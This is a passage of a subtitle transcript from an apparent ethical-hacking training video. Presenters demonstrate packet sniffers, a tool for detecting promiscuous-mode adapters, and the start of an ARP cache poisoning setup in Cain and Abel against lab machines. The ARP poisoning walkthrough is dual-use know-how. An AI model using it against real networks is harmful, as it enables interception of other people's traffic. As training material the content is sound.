00:29:32.410\nWe're gonna start running that, and\nyou can see traffic's flowing in,\n\n636\n00:29:32.410 --> 00:29:39.190\nlet's just see if we can just do this real\nquick, scroll up there for half a second.\n\n637\n00:29:39.190 --> 00:29:42.840\nWe can see that we have traffic\ncoming in in the buffer,\n\n638\n00:29:42.840 --> 00:29:45.440\nwe're seeing it kind of\nsliding through there.\n\n639\n00:29:45.440 --> 00:29:48.610\nSo we're scanning,\nwe're just sniffing traffic on the wire.\n\n640\n00:29:48.610 --> 00:29:51.120\nI have installed,\nwhen I've installed this software,\n\n641\n00:29:51.120 --> 00:29:54.020\nthe wind p cap driver that we have\nmentioned in the prior episode ,that\n\n642\n00:29:54.020 --> 00:29:57.150\nputs us into promiscuous mode or\ngives us the ability to do that.\n\n643\n00:29:57.150 --> 00:30:00.540\nSo just keep in mind that when we\nare running in promiscuous mode,\n\n644\n00:30:00.540 --> 00:30:01.460\nas we have mentioned and\n\n645\n00:30:01.460 --> 00:30:05.560\nobviously very important to for us to be\nable to do that, and think about that.\n\n646\n00:30:05.560 --> 00:30:08.650\nSo as we run this we're getting\nall sorts of traffic coming in.\n\n647\n00:30:08.650 --> 00:30:12.140\nAnd we'll let that run for\nmaybe another 5 to 10 seconds or so.\n\n648\n00:30:12.140 --> 00:30:12.850\nWe'll stop it, and\n\n649\n00:30:12.850 --> 00:30:16.410\nwe can go and then examine a packet, and\nwe'll show you what the header look like.\n\n650\n00:30:16.410 --> 00:30:17.830\nLike you drew that picture for us, but\n\n651\n00:30:17.830 --> 00:30:19.710\nI like to take a look what\na real header looks like.\n\n652\n00:30:19.710 --> 00:30:21.716\n&gt;&gt; [LAUGH]\n&gt;&gt; The one that we drew for you.\n\n653\n00:30:21.716 --> 00:30:25.256\nBut if we stop this, we just hit the red\nbutton over here to stop it, and\n\n654\n00:30:25.256 --> 00:30:27.780\nwe can pick up any packet\nthat may be in the buffer.\n\n655\n00:30:27.780 --> 00:30:29.470\nNow there's a couple different ways.\n\n656\n00:30:29.470 --> 00:30:31.940\nWe can go into edit, and\nwe can go find packet, and\n\n657\n00:30:31.940 --> 00:30:36.590\nwe can actually do a search for a specific\nkind of packet, and just click there, and\n\n658\n00:30:36.590 --> 00:30:42.760\nwe can filter traffic based on a display\nfilter, a hex value, a string.\n\n659\n00:30:42.760 --> 00:30:45.930\nSo I can go in and specify what I want.\n\n660\n00:30:45.930 --> 00:30:48.760\nI may be able to go in\nif I click on filter,\n\n661\n00:30:48.760 --> 00:30:51.390\nI can actually edit the filter\ninformation in there.\n\n662\n00:30:51.390 --> 00:30:54.600\nAnd create a little filter profile if I\ndon't want to use the one that's there.\n\n663\n00:30:54.600 --> 00:30:56.460\nWe have a lot of options in here.\n\n664\n00:30:56.460 --> 00:31:00.070\nSo I could go in, and I can do this or\nI could just obviously go through and\n\n665\n00:31:00.070 --> 00:31:02.290\njust examine any kind of\ntraffic that may be there.\n\n666\n00:31:02.290 --> 00:31:04.010\nI've got a TCP packet at the bottom.\n\n667\n00:31:04.010 --> 00:31:06.080\nThat will be good for\nus to look at the header, right?\n\n668\n00:31:06.080 --> 00:31:08.310\nSo we'll open that one up and examine it.\n\n669\n00:31:08.310 --> 00:31:12.500\nSo at the top we see the packets coming\nin, in the middle we can actually examine\n\n670\n00:31:12.500 --> 00:31:15.570\nthe data, and then at the bottom\nwe see the hex of the frame or\n\n671\n00:31:15.570 --> 00:31:16.950\nof the packet that we're looking at.\n\n672\n00:31:16.950 --> 00:31:20.150\nSo we're gonna take this TCP packet,\nwe're gonna open it up,\n\n673\n00:31:20.150 --> 00:31:21.860\nand let's just quickly do an examination.\n\n674\n00:31:23.260 --> 00:31:27.870\nSo this one is 438 bytes\nin size on the wire, and\n\n675\n00:31:27.870 --> 00:31:32.550\nit was captured on interface 0, so\nthe interface that I was monitoring.\n\n676\n00:31:32.550 --> 00:31:34.550\nSo we can see the interface ID.\n\n677\n00:31:34.550 --> 00:31:36.690\nWe can see the encapsulation type so\n\n678\n00:31:36.690 --> 00:31:40.630\nwe see its ethernet, so that makes sense\nbecause that's our connection protocol.\n\n679\n00:31:40.630 --> 00:31:44.345\nWe see arrival time, so we can see\nwhen it arrived and we can obviously\n\n680\n00:31:44.345 --> 00:31:48.712\nsee information about it if there's\nan offset of time shift, things like that.\n\n681\n00:31:48.712 --> 00:31:50.217\nWe could see the frame number.\n\n682\n00:31:50.217 --> 00:31:53.550\nWe could see the time since\nthe last frame coming in.\n\n683\n00:31:53.550 --> 00:31:56.910\nWe could scroll down, and we could\nsee the current length, and all that.\n\n684\n00:31:56.910 --> 00:31:58.940\nAnd then as we get in, and by the way,\n\n685\n00:31:58.940 --> 00:32:03.795\nwe also see the protocol is frame\nethernet type IP TCP and TPKT.\n\n686\n00:32:03.795 --> 00:32:07.055\nSo we're seeing IP and TCP packets for\n\n687\n00:32:07.055 --> 00:32:10.265\nprotocol rapid traffic in\nthis particular packet.\n\n688\n00:32:10.265 --> 00:32:11.665\nSo we're gonna be able to examine that.\n\n689\n00:32:11.665 --> 00:32:15.220\nSo we see the top of the frame there\njust to understand what's there.\n\n690\n00:32:15.220 --> 00:32:17.770\nAnd then we're gonna see\nadditional lines that\n\n691\n00:32:17.770 --> 00:32:19.870\nrepresent those protocols in the packet.\n\n692\n00:32:19.870 --> 00:32:22.740\nSo we see some ethernet\nrelated information.\n\n693\n00:32:22.740 --> 00:32:24.869\nWe see Internet protocol, IPv4.\n\n694\n00:32:24.869 --> 00:32:25.780\nWe see TCP.\n\n695\n00:32:25.780 --> 00:32:29.320\nSo we see transmission control protocol.\n\n696\n00:32:29.320 --> 00:32:31.030\nSource and destination ports.\n\n697\n00:32:31.030 --> 00:32:35.500\nSo let's look at the TCP stuff first\ncuz we talked about flags and all that.\n\n698\n00:32:35.500 --> 00:32:40.497\nSo we can see in there that we've got our\nsource ports, that's coming from 3389,\n\n699\n00:32:40.497 --> 00:32:45.380\nright, so that's gonna be\n&gt;&gt; That is going to be the port\n\n700\n00:32:45.380 --> 00:32:49.290\nthat we are originating that traffic from\nthe destination port is going out to\n\n701\n00:32:49.290 --> 00:32:51.530\ndynamic port of the 53,000 range, right?\n\n702\n00:32:51.530 --> 00:32:53.380\nSo we're gonna be able to do that.\n\n703\n00:32:53.380 --> 00:32:55.770\nI'm pretty sure port\n3389 is on our port list.\n\n704\n00:32:55.770 --> 00:32:57.830\nBut it's important you definitely\nshould be aware of, right?\n\n705\n00:32:57.830 --> 00:32:59.550\nSo hopefully you know what that is.\n\n706\n00:32:59.550 --> 00:33:03.095\nWe've got the segment number here,\nrather sequence number.\n\n707\n00:33:03.095 --> 00:33:04.810\nIt's gonna packet 1.\n\n708\n00:33:04.810 --> 00:33:07.890\nAnd we've got our header length.\n\n709\n00:33:07.890 --> 00:33:10.230\nSo we're examining and\nwe're gonna see our flags.\n\n710\n00:33:10.230 --> 00:33:12.630\nLet's just open up and\nsee what may be set.\n\n711\n00:33:12.630 --> 00:33:15.510\nLooks like we have an ACK flag set there.\n\n712\n00:33:15.510 --> 00:33:18.040\nSo we can see that we have an ACK and\na push.\n\n713\n00:33:18.040 --> 00:33:20.075\nThere's the acknowledgement\nflag right there.\n\n714\n00:33:20.075 --> 00:33:21.500\n&gt;&gt; Mm-hm.\n&gt;&gt; And by the way, when I highlight,\n\n715\n00:33:21.500 --> 00:33:24.015\nnotice the hex code right down\nthere is gonna highlight.\n\n716\n00:33:24.015 --> 00:33:25.847\n&gt;&gt; Mm-hm.\n&gt;&gt; So we can see essentially what that is\n\n717\n00:33:25.847 --> 00:33:29.240\nand in hex as we break the packet down,\nit's always kind of cool.\n\n718\n00:33:29.240 --> 00:33:32.400\nI show that to people they're like, all\nthat is those two characters right there?\n\n719\n00:33:32.400 --> 00:33:34.170\nWhat's going on with that, right?\n\n720\n00:33:34.170 --> 00:33:36.160\nSo obviously we have to think about that.\n\n721\n00:33:37.480 --> 00:33:41.510\nAnd when we have the push flag\nset as well, the PSH flag.\n\n722\n00:33:41.510 --> 00:33:42.710\nWe can see that.\n\n723\n00:33:42.710 --> 00:33:45.860\nSo, we're seeing some sort of\nan acknowledgement of traffic send\n\n724\n00:33:45.860 --> 00:33:47.410\nmost likely happening prior.\n\n725\n00:33:47.410 --> 00:33:49.430\nWe may have to go back\nup the stack to look for\n\n726\n00:33:49.430 --> 00:33:51.620\none of those packets,\nkind of track it back.\n\n727\n00:33:51.620 --> 00:33:52.990\nSo, we're able to see that.\n\n728\n00:33:52.990 --> 00:33:54.500\nWe're also able to see the checksum.\n\n729\n00:33:54.500 --> 00:33:55.610\nSo we're able to see whether or\n\n730\n00:33:55.610 --> 00:33:59.730\nnot the packet has integrity,\nwhich is obviously gonna be important.\n\n731\n00:33:59.730 --> 00:34:01.710\nLet me just bring this up here.\n\n732\n00:34:01.710 --> 00:34:06.860\nWe also can, as we scroll down,\nsee the sequence and the ACK analysis.\n\n733\n00:34:06.860 --> 00:34:09.050\nSo we actually are able to go in.\n\n734\n00:34:09.050 --> 00:34:10.650\nAlthough there's not much there.\n\n735\n00:34:10.650 --> 00:34:14.890\nBut we are able to see kind of readout\non what that acknowledgement frame and\n\n736\n00:34:14.890 --> 00:34:16.740\nwhat the process was with it.\n\n737\n00:34:16.740 --> 00:34:17.670\nSo we're able to go through.\n\n738\n00:34:17.670 --> 00:34:18.740\nWe're able to see all that.\n\n739\n00:34:18.740 --> 00:34:21.810\nAnd as we go through obviously we're\nable to break down multiple packets.\n\n740\n00:34:21.810 --> 00:34:23.330\nNow I use a different scanner.\n\n741\n00:34:23.330 --> 00:34:25.360\nI use Wireshark a lot, I use Ethereal.\n\n742\n00:34:25.360 --> 00:34:28.210\nIt's older derivative sometimes.\n\n743\n00:34:28.210 --> 00:34:31.390\nCuz I have it set up in older VMs\nthat I'll use for various things.\n\n744\n00:34:31.390 --> 00:34:35.820\nBut I also use Network chemistry's\nprotocol's scanner as well.\n\n745\n00:34:35.820 --> 00:34:38.490\nOur network chemistry is rather a sniffer,\nvery good tool.\n\n746\n00:34:38.490 --> 00:34:40.290\nWe've talked about it in prior episodes.\n\n747\n00:34:40.290 --> 00:34:42.240\nI'm sure you could find\nthe download link for it.\n\n748\n00:34:42.240 --> 00:34:45.870\nI like it because like these tools\nit does do all the analysis.\n\n749\n00:34:45.870 --> 00:34:48.370\nIt gives me the protocol\nbreakdown on the SYNs.\n\n750\n00:34:48.370 --> 00:34:52.120\nIt shows me the percentage of\ntraffic coming from different areas.\n\n751\n00:34:52.120 --> 00:34:56.990\nAnd so as we look at the Analyze area,\nI can go in and look for Enable Protocols,\n\n752\n00:34:56.990 --> 00:34:58.830\nI can decode traffic.\n\n753\n00:34:58.830 --> 00:35:03.040\nI look at Statistics and I can come\nin here and I can look at a Summary.\n\n754\n00:35:04.480 --> 00:35:07.910\nSo if I toggle over I can get\nbasic summary information.\n\n755\n00:35:07.910 --> 00:35:11.420\nI can go in, and\nI can pull down detailed information.\n\n756\n00:35:11.420 --> 00:35:13.640\nI've got tools that let me\ninteract with the data.\n\n757\n00:35:13.640 --> 00:35:14.930\nIt's a very good tool.\n\n758\n00:35:14.930 --> 00:35:17.960\nI just happen to prefer the network\nchemistry scanner, as I was saying,\n\n759\n00:35:17.960 --> 00:35:19.570\njust because I happen to like it.\n\n760\n00:35:19.570 --> 00:35:22.030\nI think the functionality is kinda cool.\n\n761\n00:35:22.030 --> 00:35:22.730\nIt does a lot.\n\n762\n00:35:22.730 --> 00:35:26.050\nSo sniffing could be something\nas simple as just going in and\n\n763\n00:35:26.050 --> 00:35:27.830\nactually running this\nkind of a capture tool.\n\n764\n00:35:27.830 --> 00:35:31.740\nNow what if we wanna see if a system\nis running in promiscuous mode,\n\n765\n00:35:31.740 --> 00:35:32.740\nhow can we do that?\n\n766\n00:35:32.740 --> 00:35:34.830\nWell we have a tool for that as we say.\n\n767\n00:35:34.830 --> 00:35:37.300\nInstead of having an app for\nthat, we have a tool.\n\n768\n00:35:37.300 --> 00:35:39.390\nRight, so there's this interesting tool.\n\n769\n00:35:39.390 --> 00:35:42.260\nLet's go grab this one,\nwe just open this up.\n\n770\n00:35:42.260 --> 00:35:47.980\nAnd come back up here to the top cuz\nit's sitting up on the top here.\n\n771\n00:35:47.980 --> 00:35:54.720\nIt's a tool called PROM, P-R-O-M Query,\nas in promiscuous mode query tool.\n\n772\n00:35:54.720 --> 00:35:56.703\nIt's actually called\npromiscuous detection tool.\n\n773\n00:35:56.703 --> 00:36:02.049\nBut it's called P-R-O-M-Q-R-Y, so\nPromqry, and when we load this tool, it\n\n774\n00:36:02.049 --> 00:36:07.245\nrelies on the .NET Framework by the way,\nso you may need to load in the appropriate\n\n775\n00:36:07.245 --> 00:36:11.871\nversion of the .NET Framework if\nyou're running it on an older system.\n\n776\n00:36:11.871 --> 00:36:14.350\nYou just follow the documentation,\npretty easy to do.\n\n777\n00:36:14.350 --> 00:36:17.750\nYou add in the IP addresses of\nthe systems that you wanna query,\n\n778\n00:36:17.750 --> 00:36:19.510\nsee if they're running\nin promiscuous mode.\n\n779\n00:36:19.510 --> 00:36:22.650\nYou'll notice I've added a couple\nIP addresses on the left here.\n\n780\n00:36:22.650 --> 00:36:25.680\nIf you click Add,\nyou simply can add a single system or\n\n781\n00:36:25.680 --> 00:36:28.050\na batch of systems through a range.\n\n782\n00:36:28.050 --> 00:36:30.310\nSo we would do that, add in a system.\n\n783\n00:36:30.310 --> 00:36:33.670\nThen we can go ahead select\nthe appropriate IP on the left.\n\n784\n00:36:33.670 --> 00:36:38.540\nSo 192.168.0.5,\nwhich is one of the other VMs I'm running,\n\n785\n00:36:38.540 --> 00:36:41.290\nso we're gonna scan that\nmachine across the wire.\n\n786\n00:36:41.290 --> 00:36:42.640\nWe're gonna start the query here.\n\n787\n00:36:44.080 --> 00:36:46.570\nSo we'll highlight that,\nclick the queried processes.\n\n788\n00:36:46.570 --> 00:36:49.510\nAnd then on the right hand side,\nit gives us an output.\n\n789\n00:36:49.510 --> 00:36:52.203\nSo it says, hey we ping that machine,\nit's running.\n\n790\n00:36:52.203 --> 00:36:55.920\nIt is running in Microsoft Adapter.\n\n791\n00:36:55.920 --> 00:36:59.080\nIt does not appear to be in promiscuous\nmode, currently not enabled.\n\n792\n00:36:59.080 --> 00:37:01.410\nAnd so I see all the different\nadapters as I scroll down.\n\n793\n00:37:01.410 --> 00:37:03.115\nAnd every adapter's profile.\n\n794\n00:37:03.115 --> 00:37:07.240\nThen it tells me whether the adapter\nis in promiscuous mode or not.\n\n795\n00:37:07.240 --> 00:37:10.540\nAnd so again I'm just scrolling down so\nyou could see it over the wire.\n\n796\n00:37:10.540 --> 00:37:12.910\nI could use this tool\nto be able to go in and\n\n797\n00:37:12.910 --> 00:37:16.440\nto be able to quickly hit a system,\nlook to see what tools,\n\n798\n00:37:16.440 --> 00:37:19.350\nrather what systems are running\npromiscuous mode, because\n\n799\n00:37:19.350 --> 00:37:22.550\nthat's gonna tell me there's probably\na sniffer associated with that box.\n\n800\n00:37:22.550 --> 00:37:26.010\nSo we use this too a lot\nwhen we do pen testing and\n\n801\n00:37:26.010 --> 00:37:29.550\nwe do vulnerability assessments because\nwe're gonna wanna see broadly in\n\n802\n00:37:29.550 --> 00:37:34.590\nthe network what systems may actually\nbe running in promiscuous mode, right?\n\n803\n00:37:34.590 --> 00:37:36.550\nAnd so that's just something to consider.\n\n804\n00:37:36.550 --> 00:37:39.700\nAnd promiscuous mode is very important,\nright, for us to know.\n\n805\n00:37:39.700 --> 00:37:42.217\nBecause again the primary\nreason you would run that way\n\n806\n00:37:42.217 --> 00:37:45.457\nis because you're running a scanner,\nright, if you think about it.\n\n807\n00:37:45.457 --> 00:37:46.783\n&gt;&gt; Really isn't a good reason for\nyou to be running?\n\n808\n00:37:46.783 --> 00:37:47.483\n&gt;&gt; There's no other reason too.\n\n809\n00:37:47.483 --> 00:37:48.540\n&gt;&gt; Otherwise, right?\n\n810\n00:37:48.540 --> 00:37:50.955\nSo if we do a quick gut check on that.\n\n811\n00:37:50.955 --> 00:37:52.200\n&gt;&gt; Mm-hm.\n&gt;&gt; Then obviously we'll\n\n812\n00:37:52.200 --> 00:37:55.780\nfind evidence of the fact that\npeople may be scanning internally.\n\n813\n00:37:55.780 --> 00:37:57.790\nSo that's a good tool to be aware of,\nright?\n\n814\n00:37:57.790 --> 00:37:59.100\nYou install the .NET Framework.\n\n815\n00:37:59.100 --> 00:38:00.100\nIt's real simple.\n\n816\n00:38:00.100 --> 00:38:01.800\nYou install this tool, you run it.\n\n817\n00:38:01.800 --> 00:38:06.000\nPretty straight forward, it's a quick\nlittle validation tool for us but\n\n818\n00:38:06.000 --> 00:38:10.350\nit gives us a tremendous advantage because\nwe don't have to worry about guessing.\n\n819\n00:38:10.350 --> 00:38:14.470\nAll we have to do is literally go look and\nsee whether or not that tool, or\n\n820\n00:38:14.470 --> 00:38:17.120\nrather whether or not that machine that\nwe're targeting would be doing that.\n\n821\n00:38:17.120 --> 00:38:18.850\nNow what about a network packet analyzer.\n\n822\n00:38:18.850 --> 00:38:21.660\nKind of another sniffer so\nwe can look at this as well.\n\n823\n00:38:21.660 --> 00:38:22.990\nLet's just close this one down.\n\n824\n00:38:24.220 --> 00:38:28.510\nLet's go in and I know you liked this\none when I told you I was installing it.\n\n825\n00:38:28.510 --> 00:38:30.568\nThis is the Sniff-O-Matic product.\n\n826\n00:38:30.568 --> 00:38:31.916\n&gt;&gt; Yes, another one of those great names.\n\n827\n00:38:31.916 --> 00:38:36.320\n&gt;&gt; Yes, from the 1950s era of\neverything being a Something-o-Matic.\n\n828\n00:38:36.320 --> 00:38:38.420\nSo let's go into Sniff-O-Matic.\n\n829\n00:38:38.420 --> 00:38:41.190\nI don't make this stuff up,\nfolks, I just talk about it.\n\n830\n00:38:41.190 --> 00:38:43.506\nSo let's launch Sniff-O-Matic.\n\n831\n00:38:43.506 --> 00:38:46.390\nOkay, little again warning\nsaying hey by the way,\n\n832\n00:38:46.390 --> 00:38:48.470\nit's not a fully licensed product.\n\n833\n00:38:48.470 --> 00:38:50.280\nDoing it in demo mode so\njust be aware of that.\n\n834\n00:38:50.280 --> 00:38:51.370\nGreat, no problem.\n\n835\n00:38:51.370 --> 00:38:52.810\nGot that installed, set up.\n\n836\n00:38:52.810 --> 00:38:57.370\nLet me just click here quickly to extend\nour session so we don't run out of time.\n\n837\n00:38:57.370 --> 00:38:58.930\nWe don't want that to happen.\n\n838\n00:38:58.930 --> 00:39:03.394\nAll right, and so once we have\nSniff-O-Matic set up and we install it.\n\n839\n00:39:03.394 --> 00:39:04.993\nWe're gonna go in and\nwe're gonna launch that.\n\n840\n00:39:04.993 --> 00:39:09.230\nAnd then, what we're gonna be able to do,\nis we're gonna be able to start it.\n\n841\n00:39:09.230 --> 00:39:12.620\nSo we just run the little green\narrow here, right, to start.\n\n842\n00:39:12.620 --> 00:39:16.700\nYou could see it's starting\nto pull in IP information,\n\n843\n00:39:16.700 --> 00:39:19.050\ndestination information, protocol.\n\n844\n00:39:19.050 --> 00:39:22.110\nAnd ports, and this kind of stuff,\nand what's going on with it.\n\n845\n00:39:22.110 --> 00:39:24.570\nSo again, we're running this\nlocally on this machines,\n\n846\n00:39:24.570 --> 00:39:29.170\ncapturing all the in bound packets,\nand it's showing us what's coming in.\n\n847\n00:39:29.170 --> 00:39:32.930\nAnd then if we go in, and\nwe launch a webpage for instance,\n\n848\n00:39:32.930 --> 00:39:35.060\nwe'll find that kind of traffic in there.\n\n849\n00:39:35.060 --> 00:39:39.630\nWe can look at the traffic, we can begin\nto see what's going on, but thinking for\n\n850\n00:39:39.630 --> 00:39:41.430\na minute generic or\nwhatever kind of pattern.\n\n851\n00:39:41.430 --> 00:39:45.360\n[COUGH] Excuse me, when they look for,\njust highlight any one of these, and I'm\n\n852\n00:39:45.360 --> 00:39:49.541\ngonna highlight the one that looks like\nit's going out to a different destination.\n\n853\n00:39:49.541 --> 00:39:52.729\nWe're sending out a SIM\npacket here as you can see.\n\n854\n00:39:52.729 --> 00:39:54.295\nTo a 209.10 address, right?\n\n855\n00:39:54.295 --> 00:39:56.450\nSomewhere outside of our network.\n\n856\n00:39:56.450 --> 00:39:58.250\nAnd so I can begin to monitor this, and\n\n857\n00:39:58.250 --> 00:40:00.850\nI can begin to see in real\ntime what's happening.\n\n858\n00:40:00.850 --> 00:40:04.410\nWe've got the little network monitor\nfunctionality going on down there.\n\n859\n00:40:04.410 --> 00:40:06.990\nSo we've got that, that's obviously nice.\n\n860\n00:40:06.990 --> 00:40:12.620\nBut as I click here right, you'll see\nthat I'm changing the information.\n\n861\n00:40:12.620 --> 00:40:14.520\nI've got a profile of\nit in the right here.\n\n862\n00:40:14.520 --> 00:40:17.539\nIn the little nav area so\nI can see just all of the information.\n\n863\n00:40:17.539 --> 00:40:20.420\nCuz this here I can scroll over and\nobviously see a lot.\n\n864\n00:40:20.420 --> 00:40:22.170\nIt's just another way of looking at at.\n\n865\n00:40:22.170 --> 00:40:23.170\nI can open up the pack and\n\n866\n00:40:23.170 --> 00:40:26.230\nthen essentially see the same\nkind of information.\n\n867\n00:40:26.230 --> 00:40:28.260\nI'm looking at flags if they're there.\n\n868\n00:40:28.260 --> 00:40:32.100\nThis one is not a fragmented,\nit's got Don't Fragment as an offset set.\n\n869\n00:40:32.100 --> 00:40:33.800\nThe tcb header is there.\n\n870\n00:40:33.800 --> 00:40:36.240\nI can open up the flag and\nI can see the green.\n\n871\n00:40:36.240 --> 00:40:40.030\nSo the sin packet flag is set so\nwe know it's a sin packet.\n\n872\n00:40:40.030 --> 00:40:40.870\nSo this is just another\n\n873\n00:40:40.870 --> 00:40:43.140\nway of looking at information\nthat will come out of Wireshark.\n\n874\n00:40:43.140 --> 00:40:45.580\nIt's just a different interface,\ndoes the same thing.\n\n875\n00:40:45.580 --> 00:40:46.080\n&gt;&gt; Right.\n&gt;&gt; Right?\n\n876\n00:40:46.080 --> 00:40:47.540\nWe just like it cuz it has a cool name.\n\n877\n00:40:47.540 --> 00:40:48.050\n&gt;&gt; It does.\n\n878\n00:40:48.050 --> 00:40:51.220\n&gt;&gt; So\nit allows us to kind of look at some stuff\n\n879\n00:40:51.220 --> 00:40:52.670\n&gt;&gt; But when we think about sniffing,\n\n880\n00:40:52.670 --> 00:40:56.820\nwe're thinking about going in and\nusing these kind of tools to grab stuff.\n\n881\n00:40:56.820 --> 00:40:59.380\nBut what if we actually wanna go in?\n\n882\n00:40:59.380 --> 00:41:02.790\nAnd in addition, let's say, to doing\nsome of this, we've obviously gone and\n\n883\n00:41:02.790 --> 00:41:04.960\nwe've set all of these programs up.\n\n884\n00:41:04.960 --> 00:41:07.274\nWe've been able to run them and\ntake a look at them.\n\n885\n00:41:07.274 --> 00:41:10.997\nWhat if we look at a program that\nallows us to keep an eye out for\n\n886\n00:41:10.997 --> 00:41:12.683\nsome additional traffic?\n\n887\n00:41:12.683 --> 00:41:16.262\nYou may be familiar with Cain and\nAbel, it's an oldie but a goodie.\n\n888\n00:41:16.262 --> 00:41:19.176\nOr maybe an oldie buy a not so\ngoodie in the wrong hands I believe.\n\n889\n00:41:19.176 --> 00:41:20.710\n&gt;&gt; [LAUGH] Yup.\n&gt;&gt; If it might be a good way to say that.\n\n890\n00:41:20.710 --> 00:41:22.070\nBut you have a Cain window.\n\n891\n00:41:22.070 --> 00:41:23.330\nIt's actually formally called Cain, but\n\n892\n00:41:23.330 --> 00:41:25.430\nit's Cain and\nAbel is how most people refer to it.\n\n893\n00:41:25.430 --> 00:41:29.450\nBut the Cain window, when I open it up\nhere as you can see, we can go in and\n\n894\n00:41:29.450 --> 00:41:32.330\nwe can again have this sniff traffic.\n\n895\n00:41:32.330 --> 00:41:36.490\nAnd so when we do that we can go out,\nwe can take a look at,\n\n896\n00:41:36.490 --> 00:41:40.560\nI've done a trace route and run that.\n\n897\n00:41:40.560 --> 00:41:44.010\nSo it's actually pulled in\ninformation here for us.\n\n898\n00:41:44.010 --> 00:41:47.175\nAnd then when I go in and\nI come in and I start to go.\n\n899\n00:41:47.175 --> 00:41:50.595\nAnd I have a list of machines that\nnow I may be able to work with\n\n900\n00:41:50.595 --> 00:41:52.415\nwhen I go into the Sniffer tab.\n\n901\n00:41:52.415 --> 00:41:54.605\nAnd then from the Sniffer\ntab I come down here.\n\n902\n00:41:54.605 --> 00:41:55.523\nI can look at hosts so\n\n903\n00:41:55.523 --> 00:41:58.655\nI see the list of hosts that I've\ngathered through that trace route.\n\n904\n00:41:58.655 --> 00:41:59.919\nSo I started trace route,\n\n905\n00:41:59.919 --> 00:42:02.628\nI pulled in hosts that\npotentially I can interact with.\n\n906\n00:42:02.628 --> 00:42:07.675\nSo I've got a little list here 01,\n05, 03, 04, etc.\n\n907\n00:42:07.675 --> 00:42:10.490\nAnd then if I go to APR here, right?\n\n908\n00:42:10.490 --> 00:42:14.550\nSo then I can go ahead and I can begin to\ninteract and to do some interesting stuff.\n\n909\n00:42:14.550 --> 00:42:17.270\nSo let's take a look,\nwe've got our sniffers set up.\n\n910\n00:42:17.270 --> 00:42:17.790\nWe're running it.\n\n911\n00:42:17.790 --> 00:42:20.560\nWe're gonna go in and grab,\nas we said, these addresses.\n\n912\n00:42:20.560 --> 00:42:25.680\nAnd so now, once I've done that,\nlet me go in here, I've run some tests.\n\n913\n00:42:25.680 --> 00:42:27.670\nAnd what I'm gonna do\nis I'm gonna go ahead.\n\n914\n00:42:27.670 --> 00:42:31.960\nAnd I'm gonna go and\nclick inside the APR table here.\n\n915\n00:42:31.960 --> 00:42:33.960\nSo I'm going to click here\nto activate the table.\n\n916\n00:42:33.960 --> 00:42:38.130\nAnd then what I'm gonna do, is I'm gonna\nclick the plus sign to add to the list.\n\n917\n00:42:38.130 --> 00:42:42.380\nAnd you can see I get a pick list of\nIP addresses that are available to me.\n\n918\n00:42:42.380 --> 00:42:47.350\nAnd what I'm gonna do is essentially set\nup a new ARP poison routing connection.\n\n919\n00:42:47.350 --> 00:42:51.710\nSo I'm gonna try to poison the ARP\ncache in the system by using this tool.\n\n920\n00:42:51.710 --> 00:42:53.480\nNow ARP poisoning is kind of interesting.\n\n921\n00:42:53.480 --> 00:42:57.035\nBefore we actually get into this,\nwe'll go through this in just a second.\n\n922\n00:42:57.035 --> 00:42:59.555\nBut if we remember what ARP\ndoes as a protocol, right,\n\n923\n00:42:59.555 --> 00:43:01.215\naddress resolution protocol.\n\n924\n00:43:01.215 --> 00:43:06.085\nWe're doing Mac addressed IP mapping,\nwe're IP to Mac, Mac to IP, right.\n\n925\n00:43:06.085 --> 00:43:10.002\nSo we're operating at a level where\nwe have the basic information.\n\n926\n00:43:10.002 --> 00:43:11.482\nWe're trying to translate that so\n\n927\n00:43:11.482 --> 00:43:15.112\nthat higher level functionality can\nunderstand how to send and receive, right?\n\n928\n00:43:15.112 --> 00:43:19.772\nAnd if we go into any system, and\nwe go and we pull up the ARP cache, right?\n\n929\n00:43:19.772 --> 00:43:22.870\nSo we can go to the command line in\na Windows system, arp -a, arp -c, right?\n\n930\n00:43:22.870 --> 00:43:26.410\nAnd we always know,\nhopefully you know, and please,\n\n931\n00:43:26.410 --> 00:43:28.600\nif you don't know,\nplease get in the habit of doing this.\n\n932\n00:43:28.600 --> 00:43:31.040\nIf you're not familiar with\na command that we specify,\n\n933\n00:43:31.040 --> 00:43:33.690\nand we always try to go out of our way\nto make sure you know what they are.\n\n934\n00:43:33.690 --> 00:43:35.610\nWe explain the basic concepts to you.\n\n935\n00:43:35.610 --> 00:43:38.250\nBut if you're not familiar with it for\nsome reason,\n\n936\n00:43:38.250 --> 00:43:42.790\nall you need to go do is go to a Start\nmenu on any machine here right?\n\n937\n00:43:42.790 --> 00:43:45.870\nIn the Windows world,\nopen up a command line right?\n\n938\n00:43:45.870 --> 00:43:48.620\nSo just do this and, whoop, there we go.\n\n939\n00:43:48.620 --> 00:43:50.270\nIt's that wonderful right\nclick functionality.\n\n940\n00:43:50.270 --> 00:43:51.910\nSo much for running that as an admin.\n\n941\n00:43:51.910 --> 00:43:58.390\nAll right, and all you have to do\nis type in the command in question.\n\n942\n00:43:58.390 --> 00:43:59.930\nAnd put a little /?\n\n943\n00:43:59.930 --> 00:44:01.236\nthere, right, to get the help file.\n\n944\n00:44:01.236 --> 00:44:02.600\nAnd you can rad up on it.\n\n945\n00:44:02.600 --> 00:44:04.071\nAnd one of the best ways for\n\n946\n00:44:04.071 --> 00:44:07.140\nyou to understand what we're doing is\nto start looking at these commands.\n\n947\n00:44:07.140 --> 00:44:10.758\nARP, ipconfig, I talk to people\nabout ipconfig all the time.\n\n948\n00:44:10.758 --> 00:44:14.810\nThey know ipconfig, release, renew,\nthey don't always know display, DNS cache,\n\n949\n00:44:14.810 --> 00:44:18.415\nflush DNS cache,\nsome of the other stuff that's there.\n\n950\n00:44:18.415 --> 00:44:19.990\nRight?\nSo you wanna go in and start delving in.\n\n951\n00:44:19.990 --> 00:44:21.810\nBut ARP is gonna let us interact.\n\n952\n00:44:21.810 --> 00:44:23.710\nAnd we have an ARP cache on the system.\n\n953\n00:44:23.710 --> 00:44:25.068\nAnd that's where we go.\n\n954\n00:44:25.068 --> 00:44:27.900\nAnd we have to understand from\nWindows' perspective that we always.\n\n955\n00:44:27.900 --> 00:44:30.315\nAnd it's not just Windows by the way,\n\n956\n00:44:30.315 --> 00:44:35.465\nit's every operating system that uses\nName resolution for r, uses it with DNS.\n\n957\n00:44:35.465 --> 00:44:38.630\nThis is a non-Windows,\nthis is a network stack thing, right?\n\n958\n00:44:38.630 --> 00:44:41.260\nHow we implement our protocols and\nour services.\n\n959\n00:44:41.260 --> 00:44:43.960\nWe always resolve locally\nbefore we go remote, right?\n\n960\n00:44:43.960 --> 